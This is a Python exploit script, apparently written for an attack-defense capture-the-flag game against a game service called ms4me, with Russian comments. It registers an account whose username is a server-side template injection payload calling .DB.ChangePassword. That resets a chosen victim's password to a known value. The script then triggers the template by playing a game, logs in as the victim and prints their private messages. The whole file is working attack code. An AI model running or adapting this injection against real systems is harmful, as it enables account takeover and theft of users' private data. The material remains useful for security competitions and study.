import ms4me_api
import sys
import bcrypt
from utils import generate_random_string
from requests import Session
import websocket
import threading
import time


# Заглушка для websocket
def on_message(ws: websocket.WebSocketApp, message: str):
    pass

def sploit(host: str, victim_username: str):
    victim_password = generate_random_string(12)
    
    owner_client = ms4me_api.Client(Session(), host)
    participant_client = ms4me_api.Client(Session(), host)
    owner_username = '{{ .DB.ChangePassword ' + f'"{victim_username}" ' +  f'"{bcrypt.hashpw(victim_password.encode(), bcrypt.gensalt(10)).decode()}"' + ' }}'
    owner_password = generate_random_string(12)
    owner_client.register(owner_username, owner_password)
    owner_client.login(owner_username, owner_password)
    id = owner_client.create_game(generate_random_string(12), False)
    
    participant_username, participant_password = generate_random_string(12), generate_random_string(12)
    participant_client.register(participant_username, participant_password)
    participant_client.login(participant_username, participant_password)
    participant_client.enter_game(id)
    
    owner_ws = owner_client.run_ws_conn(on_message, id)
    owner_thread = threading.Thread(target=owner_ws.run_forever)
    owner_thread.start()
    participant_ws = participant_client.run_ws_conn(on_message, id)
    participant_thread = threading.Thread(target=participant_ws.run_forever)
    participant_thread.start()
    
    time.sleep(0.5) # Перед стартом игры ждём, пока игроки подключатся по ws
    owner_client.start_game(id)
    
    try:
        participant_client.check_all_cells_parallel(id)
    except:
        pass
    participant_client.get_congratulation(id)
    
    victim_client = ms4me_api.Client(Session(), host)
    victim_client.login(victim_username, victim_password)
    games = victim_client.get_my_games()
    for game in games:
        msgs = victim_client.read_messages(game.id)
        for msg in msgs:
            print(msg.text, flush=True)
    
    owner_ws.close()
    participant_ws.close()
    owner_thread.join()
    participant_thread.join()
    


if __name__ == "__main__":
    try:
        host = sys.argv[1]
        if host == "":
            print("empty host")
            sys.exit(1)
        victim_username = sys.argv[2]
        if victim_username == "":
            print("empty victim_username")
            sys.exit(2)
    except Exception:
        print(f"usage: {sys.argv[0]} <host> <victim_username>")
        sys.exit(3)
    
    sploit(host, victim_username)
